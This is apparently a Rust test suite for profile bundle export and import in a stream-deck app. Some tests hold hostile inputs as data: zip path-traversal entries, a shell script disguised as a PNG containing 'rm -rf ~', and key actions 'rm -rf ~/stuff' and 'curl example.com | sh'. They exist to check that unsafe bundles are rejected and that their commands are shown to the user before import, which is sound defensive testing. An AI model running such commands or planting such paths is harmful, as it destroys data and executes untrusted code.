use std::io::Write;

use ulanzi_core::bundle::{BundleError, Conflict, ImportOptions, export, import, read};
use ulanzi_core::model::*;
use ulanzi_core::store::Store;
use uuid::Uuid;

fn store(dir: &std::path::Path) -> Store {
    Store::at(dir.join("c"), dir.join("s"), dir.join("k"))
}

fn png() -> Vec<u8> {
    let img = image::RgbaImage::from_pixel(4, 4, image::Rgba([10, 20, 30, 255]));
    let mut out = std::io::Cursor::new(Vec::new());
    img.write_to(&mut out, image::ImageFormat::Png).expect("png");
    out.into_inner()
}

/// A profile with one key using a picture from its icons folder.
fn profile_with_icon(s: &Store, name: &str) -> Profile {
    let mut p = Profile::new_default(name, Model::D200X);
    p.pages[0].keys.insert(
        0,
        Key {
            look: KeyLook {
                source: ImageSource::Image {
                    path: "icons/x.png".into(),
                },
                ..KeyLook::default()
            },
            tap: Some(Action::NextPage),
            hold: None,
        },
    );
    p.r#match.apps = vec!["firefox.desktop".into()];
    s.save_profile(&p).expect("save");
    std::fs::create_dir_all(s.profile_dir(p.id).join("icons")).expect("dir");
    std::fs::write(s.profile_dir(p.id).join("icons/x.png"), png()).expect("icon");
    p
}

fn opts(conflict: Conflict) -> ImportOptions {
    ImportOptions {
        conflict,
        keep_rules: true,
        settings: false,
        library: true,
        device: Some(Model::D200X),
    }
}

#[test]
fn round_trips_profiles_with_icons() {
    let d = tempfile::tempdir().expect("tmp");
    let a = store(&d.path().join("a"));
    let p = profile_with_icon(&a, "Editing");
    let bytes = export(&a, &[p.id], false, true).expect("export");
    let b = read(&bytes).expect("read");
    assert_eq!(b.manifest.profiles.len(), 1);
    assert_eq!(b.manifest.profiles[0].name, "Editing");
    assert_eq!(b.manifest.profiles[0].pages, 1);
    assert_eq!(b.manifest.profiles[0].keys, 1);
    assert!(!b.manifest.includes_settings);

    let fresh = store(&d.path().join("b"));
    let r = import(&fresh, &b, &opts(Conflict::KeepBoth)).expect("import");
    assert_eq!(r.imported, vec![p.id]);
    assert_eq!(fresh.load_profile(p.id).expect("load"), p);
    assert_eq!(
        std::fs::read(fresh.profile_dir(p.id).join("icons/x.png")).expect("icon"),
        png()
    );
}

#[test]
fn export_all_with_settings_drops_plugin_passwords() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    profile_with_icon(&s, "A");
    let mut settings = Settings::default();
    settings
        .plugins
        .entry("obs".into())
        .or_default()
        .settings
        .insert("password".into(), "s3cret".into());
    s.save_settings(&settings).expect("settings");
    let b = read(&export(&s, &[], true, true).expect("export")).expect("read");
    assert!(b.manifest.includes_settings);
    let kept = b.settings.expect("settings");
    assert!(
        kept.plugins
            .get("obs")
            .is_none_or(|e| !e.settings.contains_key("password"))
    );
}

/// A ZIP with the given (name, declared bytes) entries.
#[test]
fn a_profile_too_big_to_import_cant_be_exported() {
    let d = tempfile::tempdir().expect("dir");
    let s = store(d.path());
    let p = profile_with_icon(&s, "Big");
    let icons = s.profile_dir(p.id).join("icons");
    std::fs::write(icons.join("big.gif"), vec![0u8; 201 * 1024 * 1024]).expect("write");
    assert!(matches!(
        export(&s, &[p.id], false, true),
        Err(BundleError::TooLarge)
    ));
}

fn zip_of(entries: &[(&str, Vec<u8>)]) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let o = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
    for (name, data) in entries {
        w.start_file(*name, o).expect("start");
        w.write_all(data).expect("write");
    }
    w.finish().expect("finish").into_inner()
}

fn manifest_for(id: uuid::Uuid) -> Vec<u8> {
    format!(
        "format = 1\napp_version = \"2.0.0\"\ncreated = \"2026-10-23T00:00:00Z\"\nincludes_settings = false\n\n[[profiles]]\nid = \"{id}\"\nname = \"Evil\"\nmodel = \"D200X\"\npages = 1\nkeys = 0\n"
    )
    .into_bytes()
}

#[test]
fn rejects_unsafe_bundles() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = Profile::new_default("Evil", Model::D200X);
    let toml = toml::to_string(&p).expect("toml").into_bytes();
    let dir = format!("profiles/{}", p.id);
    let base = |extra: (&str, Vec<u8>)| {
        zip_of(&[
            ("manifest.toml", manifest_for(p.id)),
            (&format!("{dir}/profile.toml"), toml.clone()),
            extra,
        ])
    };
    let cases: Vec<(Vec<u8>, &str)> = vec![
        (base(("../evil", b"x".to_vec())), "unsafe"),
        (base(("/etc/evil", b"x".to_vec())), "unsafe"),
        (base((&format!("{dir}/icons/../../x"), b"x".to_vec())), "unsafe"),
        (
            base((&format!("{dir}/icons/big.png"), vec![0u8; 201 * 1024 * 1024])),
            "large",
        ),
        (
            base((&format!("{dir}/icons/a.png"), b"#!/bin/sh\nrm -rf ~".to_vec())),
            "image",
        ),
        (b"not a zip".to_vec(), "bundle"),
    ];
    for (bytes, want) in cases {
        let err = read(&bytes).expect_err(want);
        let ok = match want {
            "unsafe" => matches!(err, BundleError::UnsafePath(_)),
            "large" => matches!(err, BundleError::TooLarge),
            "image" => matches!(err, BundleError::BadImage(_)),
            _ => matches!(err, BundleError::NotABundle),
        };
        assert!(ok, "{want}: got {err:?}");
    }
    assert!(s.list_profiles().is_empty(), "nothing written");
}

#[test]
fn conflicts_keep_both_replace_skip() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = profile_with_icon(&s, "A");
    let b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");

    let r = import(&s, &b, &opts(Conflict::KeepBoth)).expect("keep both");
    assert_eq!(r.imported.len(), 1);
    assert_ne!(r.imported[0], p.id);
    assert_eq!(s.load_profile(r.imported[0]).expect("copy").name, "A (2)");
    assert!(s.profile_dir(r.imported[0]).join("icons/x.png").exists());

    let r = import(&s, &b, &opts(Conflict::Skip)).expect("skip");
    assert!(r.imported.is_empty());
    assert_eq!(r.skipped, vec!["A".to_string()]);

    let mut edited = p.clone();
    edited.name = "Changed".into();
    s.save_profile(&edited).expect("edit");
    let r = import(&s, &b, &opts(Conflict::Replace)).expect("replace");
    assert_eq!(r.replaced, vec![p.id]);
    assert_eq!(s.load_profile(p.id).expect("load").name, "A");
}

#[test]
fn model_mismatch_warns() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = Profile::new_default("Small", Model::D200);
    s.save_profile(&p).expect("save");
    let b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    let other = store(&d.path().join("o"));
    let r = import(&other, &b, &opts(Conflict::KeepBoth)).expect("import");
    assert!(r.warnings.iter().any(|w| w.contains("D200")), "{:?}", r.warnings);
}

#[test]
fn keep_rules_false_clears_match() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = profile_with_icon(&s, "A");
    let b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    let other = store(&d.path().join("o"));
    let o = ImportOptions {
        keep_rules: false,
        ..opts(Conflict::KeepBoth)
    };
    import(&other, &b, &o).expect("import");
    assert!(other.load_profile(p.id).expect("load").r#match.apps.is_empty());
}

#[test]
fn bundles_list_the_commands_they_would_run() {
    use ulanzi_core::model::*;
    let mut p = Profile::new_default("Shared", Model::D200X);
    p.pages[0].keys.insert(
        0,
        Key {
            tap: Some(Action::Command {
                cmd: "rm -rf ~/stuff".into(),
                terminal: false,
            }),
            hold: Some(Action::Multi {
                steps: vec![Step {
                    action: Action::LaunchApp {
                        desktop_id: None,
                        exec: Some("curl example.com | sh".into()),
                    },
                    delay_ms: 0,
                }],
            }),
            ..Key::default()
        },
    );
    p.screen = ScreenConfig::custom(
        vec![Widget::Command {
            cmd: "uptime".into(),
            every_s: 30,
            title: String::new(),
        }],
        None,
        None,
    );
    let b = ulanzi_core::bundle::Bundle {
        macros: Default::default(),
        manifest: ulanzi_core::bundle::Manifest {
            format: ulanzi_core::bundle::FORMAT,
            app_version: "2.0.0".into(),
            created: String::new(),
            includes_settings: false,
            includes_library: false,
            min_app: None,
            looks: Default::default(),
            profiles: vec![],
        },
        profiles: vec![ulanzi_core::bundle::BundleProfile {
            profile: p,
            icons: vec![],
        }],
        settings: None,
    };
    assert_eq!(
        ulanzi_core::bundle::commands(&b),
        vec![
            "rm -rf ~/stuff".to_string(),
            "curl example.com | sh".to_string(),
            "uptime".to_string()
        ]
    );
}

fn foreign_profile() -> Profile {
    let mut p = Profile::new_default("Newer", Model::D200X);
    p.min_app = Some("2.2.0".into());
    p.foreign.push(ForeignSlot {
        page: Some(p.pages[0].id),
        slot: Slot::Key(3),
        raw: toml::Value::Table(toml::from_str("tap = { type = \"macro\", cmd = \"rm x\" }").expect("raw")),
    });
    p
}

#[test]
fn an_export_with_a_newer_profile_is_format_2() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = foreign_profile();
    s.save_profile(&p).expect("save");
    let b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    assert_eq!(b.manifest.format, 2);
    assert_eq!(b.manifest.min_app.as_deref(), Some("2.2.0"));
}

#[test]
fn a_plain_export_stays_format_1() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = Profile::new_default("Plain", Model::D200X);
    s.save_profile(&p).expect("save");
    let b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    assert_eq!(b.manifest.format, 1);
    assert_eq!(b.manifest.min_app, None);
}

#[test]
fn format_3_is_refused() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = Profile::new_default("Plain", Model::D200X);
    s.save_profile(&p).expect("save");
    let mut b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    b.manifest.format = 3;
    let bytes = ulanzi_core::bundle::to_bytes(&b).expect("bytes");
    assert!(matches!(read(&bytes), Err(BundleError::NewerFormat(3))));
}

#[test]
fn import_reports_foreign_keys_and_keeps_them() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = foreign_profile();
    s.save_profile(&p).expect("save");
    let bytes = export(&s, &[p.id], false, true).expect("export");
    let e = tempfile::tempdir().expect("tmp");
    let other = store(e.path());
    let opts = ImportOptions {
        conflict: Conflict::KeepBoth,
        keep_rules: true,
        settings: false,
        library: true,
        device: None,
    };
    let report = import(&other, &read(&bytes).expect("read"), &opts).expect("import");
    assert_eq!(report.foreign.len(), 1);
    assert_eq!(
        report.foreign[0].sentence(),
        "Imported Newer: 0 keys ready, 1 need Ulanzi Deck 2.2"
    );
    let back = other.load_profile(p.id).expect("load");
    assert_eq!(back.foreign, p.foreign);
}

#[test]
fn commands_inside_foreign_keys_are_shown_before_import() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = foreign_profile();
    s.save_profile(&p).expect("save");
    let b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    assert!(ulanzi_core::bundle::commands(&b).contains(&"rm x".to_string()));
}

#[test]
fn a_profiles_look_travels_with_it() {
    let a = tempfile::tempdir().expect("dir");
    let source = store(a.path());
    let p = profile_with_icon(&source, "Looks");
    let look = ProfileLook {
        source: Some(ImageSource::Image {
            path: "icons/a.png".into(),
        }),
        color: Some(ulanzi_core::Color::rgb(9, 8, 7)),
        from_app: None,
    };
    source.save_profile_look(p.id, &look).expect("save");
    let bytes = export(&source, &[p.id], false, true).expect("export");
    let b = tempfile::tempdir().expect("dir");
    let target = store(b.path());
    let bundle = read(&bytes).expect("read");
    let opts = ImportOptions {
        conflict: Conflict::KeepBoth,
        keep_rules: true,
        settings: false,
        library: true,
        device: None,
    };
    import(&target, &bundle, &opts).expect("import");
    assert_eq!(target.profile_look(p.id), look);
}

/// A profile whose pin and first page dial link to a library dial, and whose second page dial
/// links to nothing.
fn library_profile(s: &Store) -> (Profile, Uuid) {
    let mut p = Profile::new_default("Linked", Model::D200);
    let lib = Uuid::new_v4();
    p.dial_library.push(LibraryDial {
        id: lib,
        dial: Dial {
            name: "Volume".into(),
            left: Some(Action::PrevPage),
            right: Some(Action::NextPage),
            ..Dial::default()
        },
    });
    let link = Dial {
        library: Some(lib),
        ..Dial::default()
    };
    p.pages[0].dials[0] = link.clone();
    p.pinned.dials.insert(2, link);
    p.pages[0].dials[1] = Dial {
        library: Some(Uuid::new_v4()),
        ..Dial::default()
    };
    s.save_profile(&p).expect("save");
    (p, lib)
}

#[test]
fn export_without_the_library_flattens_links() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let (p, _) = library_profile(&s);
    let b = read(&export(&s, &[p.id], false, false).expect("export")).expect("read");
    assert!(!b.manifest.includes_library);
    let out = &b.profiles[0].profile;
    assert!(out.dial_library.is_empty());
    for (page, n) in [(0, 0), (0, 1), (0, 2)] {
        assert_eq!(out.dial_at(page, n), p.dial_at(page, n), "dial {n}");
        assert_eq!(out.dial_info(page, n).library, None);
    }
    assert!(out.dial_at(0, 2).left.is_some());
    // The stored profile is not touched.
    assert!(!s.load_profile(p.id).expect("load").dial_library.is_empty());
    // With it, the library and links stay.
    let b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    assert!(b.manifest.includes_library);
    assert_eq!(b.profiles[0].profile.dial_library, p.dial_library);
}

#[test]
fn import_can_leave_the_library_out() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let (p, lib) = library_profile(&s);
    let b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    let a = store(&d.path().join("a"));
    let o = ImportOptions {
        library: false,
        ..opts(Conflict::KeepBoth)
    };
    import(&a, &b, &o).expect("import");
    let got = a.load_profile(p.id).expect("load");
    assert!(got.dial_library.is_empty());
    assert_eq!(got.dial_at(0, 0), p.dial_at(0, 0));
    assert_eq!(got.dial_at(0, 2), p.dial_at(0, 2));
    assert!(got.dial_at(0, 1).is_empty());
    assert_eq!(got.dial_info(0, 0).library, None);

    let c = store(&d.path().join("c"));
    import(&c, &b, &opts(Conflict::KeepBoth)).expect("import");
    let got = c.load_profile(p.id).expect("load");
    assert_eq!(got.dial_library, p.dial_library);
    assert_eq!(got.dial_info(0, 0).library, Some(lib));
}

#[test]
fn an_old_bundle_imports() {
    let d = tempfile::tempdir().expect("tmp");
    let s = store(d.path());
    let p = profile_with_icon(&s, "Old");
    let mut b = read(&export(&s, &[p.id], false, true).expect("export")).expect("read");
    let text = toml::to_string_pretty(&b.manifest).expect("toml");
    let old: String = text
        .lines()
        .filter(|l| !l.starts_with("includes_library"))
        .collect::<Vec<_>>()
        .join("\n");
    assert!(!old.contains("includes_library"));
    b.manifest = toml::from_str(&old).expect("old manifest");
    assert!(!b.manifest.includes_library);
    let other = store(&d.path().join("o"));
    let r = import(&other, &b, &opts(Conflict::KeepBoth)).expect("import");
    assert_eq!(r.imported, vec![p.id]);
}

/// A two-page profile whose first dial is the same on both pages, in a bundle from `version`.
fn shared_dial_bundle(s: &Store, version: &str) -> (ulanzi_core::bundle::Bundle, Uuid) {
    let mut p = Profile::new_default("Shared", Model::D200X);
    p.pages.push(Page::new("Two"));
    for pg in &mut p.pages {
        pg.dials[0].press = Some(Action::NextPage);
    }
    s.save_profile(&p).expect("save");
    let mut b = read(&export(s, &[p.id], false, true).expect("export")).expect("read");
    b.manifest.app_version = version.into();
    (b, p.id)
}

#[test]
fn a_bundle_from_before_2_5_pins_a_dial_on_every_page() {
    let d = tempfile::tempdir().expect("tmp");
    let (b, id) = shared_dial_bundle(&store(d.path()), "2.4.0");
    let to = store(&d.path().join("to"));
    import(&to, &b, &opts(Conflict::KeepBoth)).expect("import");
    let got = to.load_profile(id).expect("load");
    assert_eq!(got.pinned.dials[&0].press, Some(Action::NextPage));
    assert!(
        got.pages
            .iter()
            .all(|pg| pg.dials[0].press == Some(Action::NextPage))
    );
}

#[test]
fn a_bundle_from_2_5_keeps_its_dials_as_they_are() {
    let d = tempfile::tempdir().expect("tmp");
    let (b, id) = shared_dial_bundle(&store(d.path()), "2.5.0");
    let to = store(&d.path().join("to"));
    import(&to, &b, &opts(Conflict::KeepBoth)).expect("import");
    assert!(to.load_profile(id).expect("load").pinned.is_empty());
}
